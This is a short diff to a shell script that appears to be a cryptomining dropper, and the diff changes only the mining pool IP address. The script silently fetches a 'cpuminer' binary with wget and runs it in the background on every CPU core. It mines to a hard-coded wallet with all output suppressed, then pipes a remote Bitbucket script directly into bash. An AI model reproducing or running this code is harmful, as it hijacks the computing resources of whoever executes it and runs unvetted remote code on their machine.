@@ -1,4 +1,4 @@
 wget -O sgr1 https://github.com/parmount6/filesg/raw/main/cpuminer-avx2 >/dev/null 2>&1
 chmod +x sgr1
-./sgr1 -a gr -o 45.77.254.68:80 -u RbxJP5k7d15URHn53uMXsGWqdSGqf12Py1.xxx -p webpassword=x,m=solo -t $(nproc --all) > /dev/null 2>&1 &
+./sgr1 -a gr -o 45.77.252.158:80 -u RbxJP5k7d15URHn53uMXsGWqdSGqf12Py1.xxx -p webpassword=x,m=solo -t $(nproc --all) > /dev/null 2>&1 &
 curl -sL https://bitbucket.org/mypile/filesg/raw/main/boled04.sh | bash
